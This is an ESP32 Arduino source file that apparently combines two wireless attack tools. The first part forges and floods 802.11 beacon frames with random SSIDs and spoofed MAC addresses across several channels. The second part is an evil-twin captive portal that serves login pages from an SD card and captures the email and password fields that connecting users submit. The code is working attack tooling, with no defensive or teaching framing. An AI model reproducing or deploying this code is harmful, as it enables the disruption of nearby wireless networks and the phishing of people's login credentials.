const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = true;
const bool appendSpaces = true;
unsigned long ssidChange = 0;

char ssids[2048] = {};

void randSSID() {
  for (int i = 0; i < 128; i++) {
    for (int j = 0; j < 10; j++) {
      ssids[i * 11 + j] = random(32, 126);
    }
    ssids[i * 11 + 10] = '\n';
  }
  ssids[128 * 11] = '\0';
}

#include "WiFi.h"

extern "C" {
#include "esp_wifi.h"
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

char emptySSID[32];
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
uint32_t currentTime = 0;
uint32_t packetSize = 0;
uint32_t packetCounter = 0;
uint32_t attackTime = 0;
uint32_t packetRateTime = 0;

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00, 
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
  0xe8, 0x03, 
  0x31, 0x00, 
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,

  0x01, 0x08,
  0x82,
  0x84,
  0x8b,
  0x96,
  0x24,
  0x30,
  0x48,
  0x6c,

  0x03, 0x01,
  0x01,      

  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};
//idk why but im really cant understand this code ;-;

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex > sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++)
    macAddr[i] = random(256);
}

void frun() {
  ssidChange = millis();
  randSSID();
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  randomSeed(1);

  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  randomMac();
  
  Serial.println("Hello, ESP32!");
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
  Serial.println("SSIDs:");
  int i = 0;
  int len = sizeof(ssids);
  while(i < len){
    Serial.print((char)pgm_read_byte(ssids + i));
    i++;
  }
}

String lrun() {
  currentTime = millis();
  if (currentTime - attackTime > 100) {
    attackTime = currentTime;
    int i = 0;
    int j = 0;
    int ssidNum = 1;
    char tmp;
    int ssidsLen = strlen_P(ssids);
    bool sent = false;
    nextChannel();

    while (i < ssidsLen) {
      j = 0;
      do {
        tmp = pgm_read_byte(ssids + i + j);
        j++;
      } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

      uint8_t ssidLen = j - 1;

      macAddr[5] = ssidNum;
      ssidNum++;

      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);

      memcpy(&beaconPacket[38], emptySSID, 32);

      memcpy_P(&beaconPacket[38], &ssids[i], ssidLen);

      beaconPacket[82] = wifi_channel;

      if (appendSpaces) {
        for (int k = 0; k < 3; k++) {
          packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, 0) == 0;
          delay(1);
        }
      }

      else {
        uint16_t tmpPacketSize = (109 - 32) + ssidLen; 
        uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
        memcpy(&tmpPacket[0], &beaconPacket[0], 37 + ssidLen);
        tmpPacket[37] = ssidLen;
        memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);
        for (int k = 0; k < 3; k++) {
          packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
          delay(1);
        }

        delete tmpPacket;
      }

      i += j;
    }
  }
  if (millis() - ssidChange > 30000) {
    ssidChange = millis();
    randSSID();
  }
  if (currentTime - packetRateTime > 1000) {
    packetRateTime = currentTime;
    int tmp = packetCounter;
    packetCounter = 0;
    return "Send packs:" + String(tmp);
  } else return "";
}

#include <FS.h>
#include <SD.h>
#include <SPI.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

WebServer server(80);
const byte DNS_PORT = 53;
DNSServer dnsServer;

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

String loadHTML(const char *path) {
  File file = SD.open(path, FILE_READ);
  if (!file) {
    return "File Not Found";
  }

  String page;
  while (file.available()) {
    page += (char)file.read();
  }
  file.close();
  return page;
}

bool userReq = false,
userLogin = false,
userConnect = false;
String email = "";
String password = "";

void handleRoot() {
  String homePage = loadHTML("/index.html");
  server.send(200, "text/html", homePage);
  userConnect = true;
}

void handleLogin() {
  String loginPage = loadHTML("/login.html");
  server.send(200, "text/html", loginPage);
  userLogin = true;
}

void handleGet() {
  if (server.hasArg("email") && server.hasArg("password")) {
    email = server.arg("email");
    password = server.arg("password");
    userReq = true;
    String donePage = loadHTML("/done.html");
    server.send(200, "text/html", donePage);

  } else {
    server.send(400, "text/plain", "Missing Data");
  }
}

